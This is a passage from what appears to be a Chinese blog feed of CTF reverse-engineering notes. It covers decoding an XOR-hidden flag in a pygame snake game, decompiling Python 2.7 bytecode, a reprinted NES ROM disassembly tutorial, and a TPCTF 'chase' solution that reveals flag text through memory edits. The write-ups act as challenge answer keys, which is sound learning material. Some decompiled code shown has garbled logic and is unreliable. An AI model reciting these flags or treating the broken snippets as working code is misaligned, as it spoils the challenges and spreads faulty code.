y), LINE_WIDTH)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> game_over:<br>            curTime = time.time()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> curTime - last_move_time &gt; speed <span class="hljs-keyword">and</span> pause:<br>                b = <span class="hljs-literal">True</span><br>                last_move_time = curTime<br>                next_s = (snake[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + pos[<span class="hljs-number">0</span>], snake[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] + pos[<span class="hljs-number">1</span>])<br>                <span class="hljs-keyword">if</span> next_s == food:<br>                    snake.appendleft(next_s)<br>                    score += food_style[<span class="hljs-number">0</span>]<br>                    speed = orispeed - <span class="hljs-number">0.03</span> * (score // <span class="hljs-number">100</span>)<br>                    food = create_food(snake)<br>                    food_style = get_food_style()<br>                <span class="hljs-keyword">elif</span> next_s[<span class="hljs-number">0</span>] &lt;= next_s[<span class="hljs-number">0</span>] <span class="hljs-keyword">or</span> next_s[<span class="hljs-number">0</span>] &lt;= SCOPE_X[<span class="hljs-number">1</span>]:<br>                    <span class="hljs-keyword">pass</span><br>                <span class="hljs-keyword">else</span>:<br>                    SCOPE_X[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">elif</span> next_s[<span class="hljs-number">1</span>] &lt;= next_s[<span class="hljs-number">1</span>] <span class="hljs-keyword">or</span> next_s[<span class="hljs-number">1</span>] &lt;= SCOPE_Y[<span class="hljs-number">1</span>]:<br>                <span class="hljs-keyword">pass</span><br>            <span class="hljs-keyword">else</span>:<br>                SCOPE_Y[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">elif</span> next_s <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> snake:<br>            snake.appendleft(next_s)<br>            snake.pop()<br>        <span class="hljs-keyword">else</span>:<br>            game_over = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> game_over:<br>            pygame.draw.rect(screen, food_style[<span class="hljs-number">1</span>], (food[<span class="hljs-number">0</span>] * SIZE, food[<span class="hljs-number">1</span>] * SIZE, SIZE, SIZE), <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> snake:<br>            pygame.draw.rect(screen, DARK, (<br>            s[<span class="hljs-number">0</span>] * SIZE + LINE_WIDTH, s[<span class="hljs-number">1</span>] * SIZE + LINE_WIDTH, SIZE - LINE_WIDTH * <span class="hljs-number">2</span>, SIZE - LINE_WIDTH * <span class="hljs-number">2</span>), <span class="hljs-number">0</span>)<br><br>        print_text(screen, font1, <span class="hljs-number">450</span>, <span class="hljs-number">7</span>, <span class="hljs-string">f&#x27;&#x27;&#x27;得分: <span class="hljs-subst">&#123;score&#125;</span>&#x27;&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> score &gt; <span class="hljs-number">1000</span>:<br>            flag = [ <span class="hljs-number">30</span>, <span class="hljs-number">196</span>, <span class="hljs-number">52</span>, <span class="hljs-number">252</span>, <span class="hljs-number">49</span>, <span class="hljs-number">220</span>, <span class="hljs-number">7</span>, <span class="hljs-number">243</span>, <span class="hljs-number">3</span>, <span class="hljs-number">241</span>, <span class="hljs-number">24</span>, <span class="hljs-number">224</span>, <span class="hljs-number">40</span>, <span class="hljs-number">230</span>, <span class="hljs-number">25</span>, <span class="hljs-number">251</span>, <span class="hljs-number">28</span>, <span class="hljs-number">233</span>, <span class="hljs-number">40</span>, <span class="hljs-number">237</span>, <span class="hljs-number">4</span>, <span class="hljs-number">225</span>, <span class="hljs-number">4</span>, <span class="hljs-number">215</span>, <span class="hljs-number">40</span>, <span class="hljs-number">231</span>, <span class="hljs-number">22</span>, <span class="hljs-number">237</span>, <span class="hljs-number">14</span>, <span class="hljs-number">251</span>, <span class="hljs-number">10</span>, <span class="hljs-number">169</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">2</span>):<br>                flag[i] = flag[i + <span class="hljs-number">1</span>] ^ <span class="hljs-number">136</span><br>                flag[i + <span class="hljs-number">1</span>] = flag[i] ^ <span class="hljs-number">119</span><br><br>            print_text(screen, font2, (SCREEN_WIDTH - fwidth) // <span class="hljs-number">2</span>, (SCREEN_HEIGHT - fheight) // <span class="hljs-number">2</span>,<br>                       <span class="hljs-built_in">bytes</span>(flag).decode(), RED)<br>            pygame.display.update()<br>        <span class="hljs-keyword">if</span> game_over <span class="hljs-keyword">and</span> start:<br>            print_text(screen, font2, (SCREEN_WIDTH - fwidth) // <span class="hljs-number">2</span>, (SCREEN_HEIGHT - fheight) // <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;GAME OVER&#x27;</span>, RED)<br>        pygame.display.update()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>看到flag代码提取出来，注意这里要同时异或</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">flag</span> = [ <span class="hljs-number">30</span>, <span class="hljs-number">196</span>, <span class="hljs-number">52</span>, <span class="hljs-number">252</span>, <span class="hljs-number">49</span>, <span class="hljs-number">220</span>, <span class="hljs-number">7</span>, <span class="hljs-number">243</span>, <span class="hljs-number">3</span>, <span class="hljs-number">241</span>, <span class="hljs-number">24</span>, <span class="hljs-number">224</span>, <span class="hljs-number">40</span>, <span class="hljs-number">230</span>, <span class="hljs-number">25</span>, <span class="hljs-number">251</span>, <span class="hljs-number">28</span>, <span class="hljs-number">233</span>, <span class="hljs-number">40</span>, <span class="hljs-number">237</span>, <span class="hljs-number">4</span>, <span class="hljs-number">225</span>, <span class="hljs-number">4</span>, <span class="hljs-number">215</span>, <span class="hljs-number">40</span>, <span class="hljs-number">231</span>, <span class="hljs-number">22</span>, <span class="hljs-number">237</span>, <span class="hljs-number">14</span>, <span class="hljs-number">251</span>, <span class="hljs-number">10</span>, <span class="hljs-number">169</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> range(<span class="hljs-number">0</span>, len(<span class="hljs-built_in">flag</span>), <span class="hljs-number">2</span>):<br>        <span class="hljs-built_in">flag</span>[i],<span class="hljs-built_in">flag</span>[i+<span class="hljs-number">1</span>]= <span class="hljs-built_in">flag</span>[i + <span class="hljs-number">1</span>] ^ <span class="hljs-number">136</span>,<span class="hljs-built_in">flag</span>[i]^<span class="hljs-number">119</span><br><span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> range(len(<span class="hljs-built_in">flag</span>)):<br>    print(chr(<span class="hljs-built_in">flag</span>[i]),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="3、如果python版本不一样，那么反编译出来的py就不一样，所以得在线网站反编译"><a href="#3、如果python版本不一样，那么反编译出来的py就不一样，所以得在线网站反编译" class="headerlink" title="3、如果python版本不一样，那么反编译出来的py就不一样，所以得在线网站反编译"></a>3、如果python版本不一样，那么反编译出来的py就不一样，所以得在线网站反编译</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721446247641-c20b0ad8-b4b2-42fa-af99-e5284d71cba4.png"></p><h3 id="可以用在线网站查看python文件的版本"><a href="#可以用在线网站查看python文件的版本" class="headerlink" title="可以用在线网站查看python文件的版本"></a>可以用在线网站查看python文件的版本</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721446520216-98c3e501-afdb-4bd4-a1e6-b90347021486.png"></p><h3 id="3-10-9的python反编译2-7的py就会出错的"><a href="#3-10-9的python反编译2-7的py就会出错的" class="headerlink" title="3.10.9的python反编译2.7的py就会出错的"></a>3.10.9的python反编译2.7的py就会出错的</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.9.1</span><br><span class="hljs-comment"># Python bytecode version base 2.7 (62211)</span><br><span class="hljs-comment"># Decompiled from: Python 3.10.9 | packaged by Anaconda, Inc. | (main, Mar  1 2023, 18:18:15) [MSC v.1916 64 bit (AMD64)]</span><br><span class="hljs-comment"># Embedded file name: encode.py</span><br><span class="hljs-comment"># Compiled at: 2019-08-19 21:01:57</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Welcome to Re World!&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Your input1 is your flag~&#x27;</span><br>l = <span class="hljs-built_in">len</span>(input1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>    num = ((input1[i] + i) % <span class="hljs-number">128</span> + <span class="hljs-number">128</span>) % <span class="hljs-number">128</span><br>    code += num<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l - <span class="hljs-number">1</span>):<br>    code[i] = code[i] ^ code[i + <span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span> code<br>code = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <br> <span class="hljs-number">10</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>]<br><br><span class="hljs-comment"># okay decompiling encode.pyc</span><br></code></pre></td></tr></table></figure><p>这是在线网站编译出来的正确文件</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs clean">#!/usr/bin/env python<br># visit https:<span class="hljs-comment">//tool.lu/pyc/ for more information</span><br># Version: Python <span class="hljs-number">2.7</span><br><br>print <span class="hljs-string">&#x27;Welcome to Re World!&#x27;</span><br>print <span class="hljs-string">&#x27;Your input1 is your flag~&#x27;</span><br>l = len(input1)<br>for i <span class="hljs-keyword">in</span> range(l):<br>    num = ((input1[i] + i) % <span class="hljs-number">128</span> + <span class="hljs-number">128</span>) % <span class="hljs-number">128</span><br>    <span class="hljs-keyword">code</span> += num<br><br>for i <span class="hljs-keyword">in</span> range(l - <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">code</span>[i] = <span class="hljs-keyword">code</span>[i] ^ <span class="hljs-keyword">code</span>[i + <span class="hljs-number">1</span>]<br><br>print <span class="hljs-keyword">code</span><br><span class="hljs-keyword">code</span> = [<br>    <span class="hljs-string">&#x27;%1f&#x27;</span>,<br>    <span class="hljs-string">&#x27;%12&#x27;</span>,<br>    <span class="hljs-string">&#x27;%1d&#x27;</span>,<br>    <span class="hljs-string">&#x27;(&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span>,<br>    <span class="hljs-string">&#x27;%01&#x27;</span>,<br>    <span class="hljs-string">&#x27;%06&#x27;</span>,<br>    <span class="hljs-string">&#x27;%14&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span>,<br>    <span class="hljs-string">&#x27;,&#x27;</span>,<br>    <span class="hljs-string">&#x27;%1b&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span>,<br>    <span class="hljs-string">&#x27;?&#x27;</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span>,<br>    <span class="hljs-string">&#x27;6&#x27;</span>,<br>    <span class="hljs-string">&#x27;*&#x27;</span>,<br>    <span class="hljs-string">&#x27;:&#x27;</span>,<br>    <span class="hljs-string">&#x27;%01&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span>,<br>    <span class="hljs-string">&#x27;;&#x27;</span>,<br>    <span class="hljs-string">&#x27;%&#x27;</span>,<br>    <span class="hljs-string">&#x27;%13&#x27;</span>]<br></code></pre></td></tr></table></figure><p>附上re代码，</p><h3 id="取余考查过很多次了记录一下，要保证在字符的范围内"><a href="#取余考查过很多次了记录一下，要保证在字符的范围内" class="headerlink" title="取余考查过很多次了记录一下，要保证在字符的范围内"></a>取余考查过很多次了记录一下，要保证在字符的范围内</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">code</span> = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\x1f&#x27;</span>, <span class="hljs-string">&#x27;\x12&#x27;</span>, <span class="hljs-string">&#x27;\x1d&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;\x01&#x27;</span>, <span class="hljs-string">&#x27;\x06&#x27;</span>, <span class="hljs-string">&#x27;\x14&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;\x1b&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;\x01&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;\x13&#x27;</span>]</span><br><br><span class="hljs-selector-tag">code</span> = <span class="hljs-selector-attr">[ord(i)for(i)in(code)]</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>l=<span class="hljs-built_in">len</span>(code)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(l)</span></span><br><span class="hljs-keyword">for</span> <span class="hljs-attribute">x</span> in <span class="hljs-built_in">range</span>(l-<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-selector-tag">code</span><span class="hljs-selector-attr">[x]</span>=<span class="hljs-selector-tag">code</span><span class="hljs-selector-attr">[x]</span>^<span class="hljs-selector-tag">code</span><span class="hljs-selector-attr">[x+1]</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>   <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>       num=<span class="hljs-selector-tag">code</span><span class="hljs-selector-attr">[i]</span>+j*<span class="hljs-number">128</span>-<span class="hljs-selector-tag">i</span><br>       <span class="hljs-keyword">if</span> num&gt;=<span class="hljs-number">33</span> and num&lt;=<span class="hljs-number">127</span>:<br>           flag+=<span class="hljs-built_in">chr</span>(num)<br>           break<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>REVERSE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nes逆向</title>
    <link href="/2025/03/22/nes%E9%80%86%E5%90%91/"/>
    <url>/2025/03/22/nes%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/fogota/article/details/6767758">https://blog.csdn.net/fogota/article/details/6767758</a></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>一、如何找到Mapper&#x3D;0的NES游戏？</p><p>你自然有不少的NES文件，同时也知道上哪去下载这些文件，你可以多下载一些你觉得简单的游戏。我下面介绍查看mapper值的方法。</p><p>我已经找到几个Mapper&#x3D;0的游戏：超级玛丽、坦克大战</p><p>方法有两个</p><p>方法(1) VirtuaNES</p><p>用VirtuaNES 打开NES文件，点菜单“文件-ROM信息”就可以查看mapper值了。</p><p>方法(2) NesHeader</p><p>用网友“疾风の迅雷”写的一个软件NesHeader.exe，可以批量读取整个文件夹上所有NES文件的ROM信息。</p><p>**</p><p>找到Mapper0的NES游戏之后，我们来确定机器码的运行首地址。</p><p>Mapper0的nes只有一段机器码段，这就好办了。其首地址有可能是</p><p>$8000 或 $C000</p><p>先不要问我为什么有两个可能性，我先来教你判断。</p><p>二、怎样判断Mapper0的NES游戏的机器码的首地址。</p><p>第一步：我提供两个办法。</p><p>先看NES文件的大小,</p><p>NES文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741418451147-c7014651-ee07-41a9-b57d-f2227826a2a0.png"></p><p>另一个办法：用上面提到的NesHeader.exe，查看PROM大小,</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741418463059-b44b4680-4b01-4282-a99b-9ea6a0874ca8.png"></p><p>第二步：如果nes大小&#x3D;24K则要查看游戏程序的运行地址区域。</p><p>用Fcdebug打开ROM，点菜单DEBUG，打开“指令显示&#x2F;控制”窗口。按“暂停”，查看（运行）地址。（这时看到的是正在运行任一条指令）</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741418480682-5e7ed3b8-7e54-481a-8da1-19dd483fcc67.png"></p><p>本办法是针对Mapper0的NES而设计的，对于别的Mapper值则完全不适用。</p><p>钻牛角的人要跑来问“别的Mapper是如何找到首地址？”</p><p>我在文章的后面解答一下吧。</p><p>**</p><p>接下来要将机器码从NES文件上分离出来。</p><p>你要知道，NES文件是由文件头(Head)、程序ROM（即PROM）、图形ROM（即VROM）组成。在ROM里面，连接的顺也是Head-PROM-VROM。其中Head固定占16字节；PROM占[n x 16K]，n是一个倍数；VROM占[m x 8K]，m是一个倍数。</p><p>朋友们看出来了，这个PROM的大小和VROM的大小在ROM信息中出现过。</p><p>PROM一般是16K为1页(1 bank)，也有8K,4K为单位的。因不同的Mapper值而异。（NES文件中统统以16K为单位记录）</p><p>我们专门说Mapper0，这个号是不切页的，所以可以看成只有1页，也就是说：</p><p>注：机器码首地址，指机器码运行时在寄存器中的首地址，不是NES文件上的地址。</p><p>NES大小</p><p>PROM大小</p><p>机器码首地址</p><p>机器码末地址</p><p>机器码长度</p><p>40K</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741420979634-50c13261-8ea0-4a2a-90f8-42ae8eebea88.png"></p><p>在上面的述中揭示了一些东西。要是看不明白也没关系，下面可以照着做。</p><p>三、如何才能将机器码从NES文件上分离出来？</p><p>我提供两个办法。上面用到的地址，我都算准了。</p><p>方法(1)DUMP法：</p><p>用FCdebug(NES_debug)运行ROM，点菜单DEBUG，打开“指令显示&#x2F;控制”窗口。按“暂停”，在窗口的最底行，找到“内存”，在边上的两个编辑框里，填入首地址和末地址，建议末地址统一填FFFF，其中$号省略。然后按“DUMP下来”，保存成mem文件。</p><p>FCdebug是VirtuaNES的一个改版，加入了debug功能。</p><p>方法(2)HEX编辑法：</p><p>用HEX类编辑软件，打开ROM。例如Hex Workshop。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741420994150-67b1ac62-76fd-4ae2-bf02-d7b347c5a242.png"></p><p>将这个地址以下的部分（包括这个分界点）删除或剪切走。留下的部分另存为mem文件。</p><p>**</p><p>终于到了反汇编软件上场了。</p><p>有人会问：“这个mem是什么文件？”</p><p>这个是内存文件，其实就是机器码，里面没有别的东西了。这个后缀名不重要，因为都没有关联软件。你叫他bin文件或别的都行。我只为统一叫法。</p><p>四、如何将mem文件显示成汇编代码呢？</p><p>我用这个</p><p>看图标,这是我用的“反汇编器”。它可以对多种CPU进行反汇编。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741421022907-3e6fcc2e-ca2e-4252-986c-12cb303d8471.png"></p><p>（1）打开它，先要选CPU，在窗口右上角选6502。</p><p>（2）用这个反汇编软件,打开mem文件。</p><p>（3）然后点选项“BIN文件”,在开始地址,填上“首地址”,</p><p>（4）确定提勾“立即反编译”，点“确定”就OK</p><p>（5）保存反汇编的asm文档,结束。</p><p>**</p><p>汇编代码是反出来了。可是问题来了：“从何看起？”</p><p>针对NES的结构，机器码是有一个入口的，这个入口的地址写在一个固定的地方。我们叫“指针”。共有3个指针，都放在一起，分别指向NMI、RESET、IRQ|BRK。其中RESET就是主程序的入口，NMI是中断的入口，IRQ|BRK是另一种中断入口。</p><p>五、如何找到程序的入口？</p><p>将asm文件（用记事本）打开，滚动条向下拉，拉到底。看到FFFA到FFFF的数据，抄下来。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741421106794-4b2335c0-145a-470f-a4ae-039659f924eb.png"></p><p>记a,b 是一组指针，实际地址为ba，即a为低位，b为高位。如此类推得3组指针</p><p>NMI &#x3D; ba</p><p>RESET &#x3D; dc</p><p>IRQ|BRK &#x3D; fe</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741421059983-d610e2cd-cb14-48ce-a625-ef24d88859d3.png"></p><p>NMI &#x3D; $8035</p><p>RESET &#x3D; $8000</p><p>IRQ|BRK &#x3D; $805C</p><p>六、注意事项</p><p>反汇编的结果不是全都是代码，其中有部分可能会是数据，也有可能整页都是图型（CHR）数据。反汇编器总是优先将能够反成代码的译成代码。于是你会发现在DB旁边出现没有作用的代码，有时发现代码去读一个指令，其实是在读指针或数据。</p><p>另外一些软件生成的ROM会加入一些没机会运行的代码。这可能是优化不完全。</p><p>七、局部反汇编，只做第三步和第四步就行。其中第三步用dump法。具体，多接触就会了解。</p><p>疑难解答：</p><p>Mapper是什么?</p><p>Mapper是一个编号，用于区分不同电路结构的卡带。NES模拟器拿一个ROM当作是一个卡带来模拟，那么卡带的电路也要区分才能模拟的。卡带不是标准统一的，当时不同的NES游戏开发商都开发出自己独有的保密的卡带；还发展出多个不同的升级产品，可以令游戏性能更理想；同时对游戏程序有保密作用。</p><p>为什么Mapper0的ROM机器码首地址有可能是$8000或$C000？</p><p>Mapper0就是表示卡带电路没有任何特别，卡带的寄存器是直接接到CPU总线上的。也就是有可能</p><p>(1) 16K的寄存器接到$8000-$BFFF的地址上并镜像到$C000-FFFF。</p><p>(2) 32K的寄存器接到$8000-$FFFF的地址上。</p><p>在(1)情况下，$8000-$BFFF和$C000-FFFF的机器码是完全一样的。主要是看程序的作者，将代码（基于）.org $8000还是.org $C000进行编译的。</p><p>我本来想在“判断首地址”的方法用程序入口的办法，但这个不准确，因为在(1)情况下我可以恶作剧的将程序入口改成对应镜像的位置，程序一样是正常运行的。</p><p>Mapper0以外的ROM是如何找到首地址？</p><p>只有Mapper0不切页，换句话说，Mapper0是静态将寄存器接入总线。其余的Mapper都是动态的将寄存器接入总线。也就是说，是通过程序控制接入某一块寄存器接入总线上某地址段，而原接入的块（页）断开。</p><p>答案就是：你要先知道最早是默认接入的寄存器页，将之按mapper0的方法反汇编。然后从程序入口，一行一行看代码，看调入了哪一页，然后计算这一页的位置，将它分离出来。再反汇编。如此直到掌握全部页的动向。</p><h1 id="FCEUX使用"><a href="#FCEUX使用" class="headerlink" title="FCEUX使用"></a>FCEUX使用</h1><h2 id="debug-ppu-viewer"><a href="#debug-ppu-viewer" class="headerlink" title="debug ppu viewer"></a>debug ppu viewer</h2><p>右键可以更改颜色</p><p><a href="https://fceux.com/web/help/PPUViewer.html">https://fceux.com/web/help/PPUViewer.html</a></p><p>介绍</p><p>NES 架构包括一个 6502 CPU 以及一个称为 PPU（图片处理单元）的自定义视频控制器。PPU 的视频内存与主 CPU 内存分开，可以通过特殊端口进行读&#x2F;写（请参阅 <a href="https://fceux.com/web/help/PPU.html">PPU 内存</a>）。</p><p>PPU 查看器将仅显示当前 PPU 内存的内容。它不会以任何方式更改游戏数据。</p><p>使用 PPU 查看器</p><p>在扫描线上显示</p><p>此选项使其显示屏幕绘制该特定扫描线时 PPU 的外观。它对于像 SMB 这样的游戏很有用，这些游戏会在帧中交换模式表（例如，用于状态栏内容）。</p><p>右键单击其中一个 PPU 面板将更改显示它的调色板，在图案调色板之间循环，然后是 sprite 调色板，然后是第九个固定的灰色调色板（如果所有调色板当前都是黑色的，则可用于检查 CHR）。</p><p>将鼠标光标放在图块上将显示图块地址。将光标移动到调色板颜色上将给出调色板地址。  </p><p>当 <a href="https://fceux.com/web/help/CodeDataLogger.html">Code&#x2F;Data Logger</a> 运行时，您还可以使用 “Mask unused graphics” 功能。或者，您只能遮罩已使用（绘制或以其他方式访问）的图块，并强调未使用的图块（例如，为了查找秘密 Sprite）。</p><p>注意：此功能仅适用于使用 CHR ROM 的游戏，因为代码&#x2F;数据记录器仅记录对 CHR ROM 的访问。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741708767826-f8f2b419-b32e-4905-b88a-5ff17c37cf22.png"></p><h2 id="debug-cheat"><a href="#debug-cheat" class="headerlink" title="debug cheat"></a>debug cheat</h2><p>先看ram search 确定变量</p><p>再cheat 可以导入随机数</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="例题xctf-chase"><a href="#例题xctf-chase" class="headerlink" title="例题xctf chase"></a>例题xctf chase</h2><p>mapper为0</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741419256964-69856734-4fc1-42ab-9929-d319c6c1fe01.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741418395482-843dfd13-99ea-4389-9718-783a3594f4eb.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741419165702-57bad6fd-0b9c-4cac-a85f-f4fe2a9d7f28.png"></p><p>看到机器码从8000</p><p>ida用二进制打开 以6502的形式</p><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741419767757-5cfb67c8-a43c-4092-b050-7fa0f8a78105.png"></p><p>可以直接ce开挂,</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741420056271-4f8d75df-b34b-48b9-8325-9b2cb0e792dc.png"></p><p>TPCTF{D0_Y0U_L1KE_</p><p>也可用FCEUX自带的cheat改动<img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741709266224-553180e2-fb39-44d6-a16b-2e2d6e5e2545.png"></p><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p>法1</p><p>经过不断调试发现AB对应的值和场景有关，每个场景对应值固定且范围普遍在0-60之间，那么尝试爆破，调整AB的值，改内存时发现会有随机性，相同的值不保证每次的闪烁结果相同，这里是尝试到0x15时看到flag2：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741709756176-dbd26352-cb02-462d-8549-d69b24d71089.png"></p><p>法2</p><p>第二段有点misc的感觉，猜测也是在内存里面只不过不会加载到屏幕上，由于每段flag开头都会有THE FLAG PT我们搜索这几个字符的tile 34 28 25,一共发现两个其实一个是第一段flag，tile D2就是代表字符2 D1也就是字符1</p><p>这段是flag1</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741710181978-c9534bf4-ebe6-4cf7-8cd9-45a6069a9013.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741710552358-b2720dac-228b-4429-bc6f-d7ad34761324.png"></p><p>第二段是flag2</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741710162833-33cee26d-da76-4d11-87dc-0609309ade76.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 